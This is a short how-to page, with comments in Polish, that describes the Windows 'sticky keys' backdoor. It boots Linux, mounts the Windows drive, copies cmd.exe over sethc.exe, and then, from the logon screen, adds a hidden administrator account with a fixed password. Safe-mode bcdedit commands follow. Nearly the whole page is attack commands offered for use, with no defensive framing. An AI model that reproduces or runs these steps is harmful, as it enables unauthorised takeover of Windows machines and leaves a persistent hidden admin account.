---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# via Linux

```python
sudo su
mkdir /mnt/C

#sprawdzanie dysków
fdisk -l

mount /dev/sda2 /mnt/C
cd /mnt/C
cd Windows
cd System32
cp sethc.exe sethcbackup.exe
cp cmd.exe sethc.exe
sync
reboot -f
```

**Windows logon**

```python
#klikamy 5xSHIFT
whoami
net user admin1$ 1qaz!QAZ /add
net localgroup administrators admin1$ /add
#restart i logujemy się

#jak jakieś błędy to można włączyć safe mode
bcdedit /set {default} safeboot minimal

#wyłączanie
bcdedit /deletevalue {default} safeboot
```
